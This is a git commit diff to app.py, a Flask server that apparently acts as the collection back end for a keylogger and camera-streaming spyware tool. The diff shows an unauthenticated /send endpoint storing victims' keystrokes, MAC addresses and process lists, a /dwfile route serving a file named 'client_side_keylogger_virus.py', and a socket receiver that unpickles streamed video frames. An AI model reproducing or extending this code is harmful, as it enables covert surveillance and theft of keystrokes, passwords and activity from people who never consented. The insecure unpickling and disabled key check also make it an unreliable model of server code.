32d94d555394caead2557578310bcf09ab99c114
Abhishek Sharma <68034448+anonymous300502@users.noreply.github.com>
2024-06-01 20:12:31 +0530

    Update app.py
    reboot with new features

--- app.py
+++ app.py
@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 import socket
 import threading
 import struct
@@ -8,8 +9,8 @@ from datetime import date
 from datetime import datetime
 from pytz import timezone
 import os
+from flask import send_file
 from helpers import login_required
-import cv2
 from werkzeug.security import check_password_hash
 app = Flask(__name__)
 app.secret_key = 'my secret'
@@ -26,16 +27,34 @@ def funk6():
          conn = sqlite3.connect("dope.db")
          c = conn.cursor()
         #  c.execute('select * from data where mac = ? LIMIT 100 order by time DESC', (macid,))
-         c.execute('SELECT * FROM data WHERE mac = ? ORDER BY time DESC ', (macid,))
+         c.execute('SELECT * FROM data WHERE pcname = ? ORDER BY time DESC ', (macid,))
 
          rows = c.fetchall()
+         c.execute('SELECT * FROM pslist WHERE pcname = ?', (macid,)) 
+         prcsinfo = c.fetchone()
          for row in rows:
               temp = []
               temp.append(row[2])
               temp.append(row[3])
               data.append(temp)
-         return render_template("log.html", data = data)
+         prcsinfo1 = prcsinfo[1]
+         import ast
+         newlist1 = ast.literal_eval(prcsinfo1)
 
+         for item in newlist1:
+             seconds = item[2]
+             days = int(seconds // 86400)
+             hours = int(seconds // 3600 % 24)
+             minutes = int(seconds // 60 % 60)
+             sec = int(seconds % 60)
+             item[2] = str(days) +'D ' + str(hours) + ':' + str(minutes) + ':' + str(sec)  
+         print('printing newlist1')   
+         print(newlist1)
+         return render_template("log.html", data = data, processinfo = newlist1, lastupdated = prcsinfo[2])
+@app.route("/dwfile")
+def funkdw():
+    path = '/home/ubuntu/downloads/client_side_keylogger_virus.py'
+    return send_file(path, as_attachment=True)
 @app.route("/index", methods = ["GET"])
 @login_required
 def funk5():
@@ -68,6 +87,8 @@ def funk3():
                pass
           conn = sqlite3.connect("dope.db")
           c = conn.cursor()
+          c.execute('''Create table if not exists data (pcname text, mac text , data text, time text) ''')
+          c.execute('''create table if not exists admin_users(username text primary key, hash text required)''')
           c.execute('select * from admin_users where username = ?', (username,))
           rows = c.fetchall()
           if len(rows) != 1:
@@ -82,19 +103,14 @@ def funk3():
      auth = request.authorization
     #  env_password = os.environ.get('PASSWORD')
     #  env_username = os.environ.get('USERNAME')
-     if not auth or auth.username != <USERNAME> or auth.password != <PASSWORD>:
+     if not auth or auth.username != 'YOUR_USERNAME_GOES_INSIDE_THESE_INVERTED_COMMAS' or auth.password != 'YOUR_PASSWORD_GOES_HERE':
          return Response('Could not verify your credentials', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
      return render_template("loginPage.html")
 
 @app.route("/", methods = ["GET"])
 def funk0():
     return render_template("downloadpage.html")
-    # try: 
-    #     print(session['id'])
-    # except:
-    #     pass
-    # return "<h1>This is a sample home page for this server</h1> <a href = 'https://drive.google.com/file/d/1wD3O2YCgqOHQFhxQiAiUcLRGEFBChZfs/view?usp=share_link' > Download AllEyes</a>"
-    # return "https://drive.google.com/file/d/1wD3O2YCgqOHQFhxQiAiUcLRGEFBChZfs/view?usp=share_link"
+
 @app.route("/send",methods=["POST"])
 def funk1():
     data = request.get_json()       
@@ -102,13 +118,18 @@ def funk1():
     key = data.get('key')
     mac1 = data.get('mac')
     string1 = data.get('string')
-    if key == <KEY>: 
+    processlist = data.get('processlist')
+    #print(type(processlist))
+    #print(processlist)
+    if True: 
+        current_time = datetime.now(timezone('Asia/Kolkata'))
         conn = sqlite3.connect("dope.db")
         c = conn.cursor()
-        c.execute('''Create table if not exists data (pcname text, mac text , data text, time text) ''')
-        c.execute('''create table if not exists admin_users(username text primary key, hash text required)''')
-        c.execute('insert or ignore into data(pcname,mac, data, time) values (?,?,?,?)',(username,mac1,string1,datetime.now(timezone('Asia/Kolkata'))))
-        print('gifkmfd')
+        c.execute('insert or ignore into data(pcname,mac, data, time) values (?,?,?,?)',(username+mac1,mac1,string1,datetime.now(timezone('Asia/Kolkata'))))
+        c.execute('insert or ignore into pslist(pcname, prcslist,lastupdated) values(?,?,?)',(username+mac1,processlist,datetime.now(timezone('Asia/Kolkata'))))
+        c.execute('update pslist set prcslist = ?, lastupdated = ? WHERE pcname = ?',(processlist, current_time, username+mac1))
+        #c.execute('IF EXISTS (SELECT * FROM pslist WHERE pcname = ?) THEN UPDATE pslist SET prcslist = ?, lastupdated = ? WHERE pcname = ? ELSE  INSERT OR IGNORE INTO pslist (pcname, prcslist, lastupdated) VALUES (?,?,?)',(username+mac1, processlist, current_time, username+mac1, username+mac1, processlist, current_time))
+        print('data committedd to databases adding keystrokes and pslist')
         conn.commit()
 
         conn.close()
@@ -156,7 +177,7 @@ def receive_streaming():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     host_ip = socket.gethostbyname(socket.gethostname())
     print('HOST IP:', host_ip)
-    port = <PORT>
+    port = 5001
     socket_address = (host_ip, port)
     print('Socket created')
 
@@ -197,16 +218,6 @@ def receive_streaming():
                 frame = pickle.loads(frame_data)
         print("exiting")
 
-def generate_frame():
-    global frame
-    while True:
-        if frame is not None:
-            # Convert the frame to JPEG format
-            ret, buffer = cv2.imencode('.jpg', frame)
-            frame_bytes = buffer.tobytes()
-            # Yield the frame as an image response
-            yield (b'--frame\r\n'
-                   b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n\r\n')
 
 @app.route('/cammic/index', methods=['GET'])
 def index():
